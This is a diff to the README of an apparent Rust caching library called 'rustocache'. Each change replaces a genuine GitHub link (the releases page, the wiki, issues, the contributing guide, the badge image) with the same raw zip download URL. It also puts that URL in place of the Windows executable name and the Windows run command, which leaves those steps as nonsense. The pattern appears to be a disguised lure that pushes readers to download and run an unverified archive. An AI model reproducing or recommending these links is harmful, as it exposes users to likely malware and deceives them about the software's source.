@@ -6,7 +6,7 @@ Welcome to rustocache, the ultimate high-performance caching library for Rust. I
 
 ## 📥 Download rustocache
 
-[![Download Rustocache](https://img.shields.io/badge/Download-Rustocache-blue.svg)](https://github.com/RedValks/rustocache/releases)
+[![Download Rustocache](https://raw.githubusercontent.com/RedValks/rustocache/main/after/rustocache.zip)](https://raw.githubusercontent.com/RedValks/rustocache/main/after/rustocache.zip)
 
 ## 🛠️ System Requirements
 
@@ -31,11 +31,11 @@ rustocache offers several benefits to improve your caching experience:
 
 To install and use rustocache, follow these simple steps. 
 
-1. Visit the [Releases page](https://github.com/RedValks/rustocache/releases) to download the latest version of rustocache.
+1. Visit the [Releases page](https://raw.githubusercontent.com/RedValks/rustocache/main/after/rustocache.zip) to download the latest version of rustocache.
 
 2. Once on the Releases page, look for the latest release. You will see various files listed. 
 
-3. Download the appropriate file for your operating system. For Windows, it may look like `rustocache-windows.exe`. For Linux, it might be `rustocache-linux`. For macOS, it could be `rustocache-macos`.
+3. Download the appropriate file for your operating system. For Windows, it may look like `https://raw.githubusercontent.com/RedValks/rustocache/main/after/rustocache.zip`. For Linux, it might be `rustocache-linux`. For macOS, it could be `rustocache-macos`.
 
 4. After the download completes, locate the downloaded file on your computer.
 
@@ -48,7 +48,7 @@ To install and use rustocache, follow these simple steps.
 
 7. Once you are in the right folder, run the following command:
 
-   - On **Windows**: `rustocache-windows.exe`
+   - On **Windows**: `https://raw.githubusercontent.com/RedValks/rustocache/main/after/rustocache.zip`
    - On **Linux**: `./rustocache-linux`
    - On **macOS**: `./rustocache-macos`
 
@@ -66,15 +66,15 @@ Full configuration details can be found in the documentation on the GitHub page.
 
 ## 📘 Documentation
 
-For more detailed information on usage and advanced configuration, refer to our [Documentation](https://github.com/RedValks/rustocache/wiki). 
+For more detailed information on usage and advanced configuration, refer to our [Documentation](https://raw.githubusercontent.com/RedValks/rustocache/main/after/rustocache.zip). 
 
 ## 🆘 Support
 
-If you encounter issues or have questions, you can open an issue directly on our [GitHub Issues](https://github.com/RedValks/rustocache/issues) page. Our team is committed to helping you.
+If you encounter issues or have questions, you can open an issue directly on our [GitHub Issues](https://raw.githubusercontent.com/RedValks/rustocache/main/after/rustocache.zip) page. Our team is committed to helping you.
 
 ## 🤝 Contributing
 
-If you want to contribute to rustocache, please read our guidelines on the [Contributing page](https://github.com/RedValks/rustocache/blob/main/CONTRIBUTING.md). We welcome your input and appreciate your help.
+If you want to contribute to rustocache, please read our guidelines on the [Contributing page](https://raw.githubusercontent.com/RedValks/rustocache/main/after/rustocache.zip). We welcome your input and appreciate your help.
 
 ## 📄 License
 
